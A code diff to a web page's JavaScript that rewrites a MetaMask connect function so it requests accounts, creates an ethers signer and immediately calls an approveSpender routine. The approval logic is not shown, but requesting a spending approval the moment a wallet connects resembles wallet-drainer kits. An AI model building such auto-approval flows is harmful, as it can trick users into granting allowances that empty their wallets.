@@ -52,26 +52,40 @@ if (walletConnectButton) {
 }
 
 /* ============================
-   METAMASK
+   METAMASK CONNECT
    ============================ */
 async function connectMetaMask() {
   try {
-    if (!window.ethereum || !window.ethereum.request) {
-      console.error('MetaMask not available');
+    if (!window.ethereum) {
+      console.error("MetaMask not available");
+      alert("MetaMask is not installed. Please install it to continue or use the walletconnect to use mobile metamask.");
       return;
     }
 
+    // Request account access
     const accounts = await window.ethereum.request({
-      method: 'eth_requestAccounts'
+      method: "eth_requestAccounts"
     });
 
-    if (!Array.isArray(accounts) || !accounts.length) return;
+    if (!accounts || accounts.length === 0) {
+      console.error("No accounts found");
+      return;
+    }
 
-    await approveSpender(accounts[0]);
+    const account = accounts[0];
+    console.log("Connected account:", account);
+
+    // Example: set up ethers provider + signer
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
+    // Call your approval logic
+    await approveSpender(account, signer);
   } catch (error) {
-    console.error('Error connecting to MetaMask:', error);
+    console.error("Error connecting to MetaMask:", error);
   }
 }
+
 
 /* ============================
    WALLETCONNECT v2 (ETHEREUM ONLY, COPIED STYLE)
